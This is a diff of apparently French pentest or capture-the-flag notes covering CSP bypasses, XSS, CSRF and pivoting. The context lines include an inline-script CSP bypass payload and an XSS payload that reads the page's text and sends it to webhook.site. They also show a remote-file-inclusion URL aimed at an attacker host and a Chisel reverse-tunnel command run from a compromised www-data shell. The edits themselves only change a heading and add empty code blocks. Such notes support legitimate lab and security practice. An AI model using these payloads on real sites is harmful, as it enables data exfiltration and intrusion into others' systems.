@@ -134,7 +134,7 @@ http://remote@IP/?page=//@ip_hacker/somefile
 ## Site de test CSP en ligne
 https://csp-evaluator.withgoogle.com/
 Google fournit une page Web de diagnostic (?) CSP appelée CSP Evaluator, et si vous la testez, elle vous informera des éléments CSP manquants. Il est normal de l'utiliser comme valeur de référence.
-## Bypass script-src unsafe-inline
+### Bypass script-src unsafe-inline
 ```
 <Svg OnLoad=alert(domain)>
 ```
@@ -153,6 +153,10 @@ document.location="229885cb-f49d-41fc-b954-2e2c56a2248c?test="+flag;
 ce qui donne le payload
 ```
 <img src='#' onerror='var flag=document.querySelector("body").innerText;document.write("<base href=\"ht"+"tp"+String.fromCharCode(58)+"//webhook.site"+"\" />");document.location="dc09032a-d28b-47f5-9297-8ea08e0c945e?test="+flag;'>
+```
+### base url
+```
+
 ```
 # CSRF
 #ExploitCSRF
@@ -218,3 +222,5 @@ On utilise *Chisel* https://github.com/jpillora/chisel/releases/tag/v1.9.1
 www-data@only4you:/tmp$
 ```
 ./chisel client 10.10.17.161:8000 R:127.0.0.1:3000 R:127.0.0.1:8001
+```
+
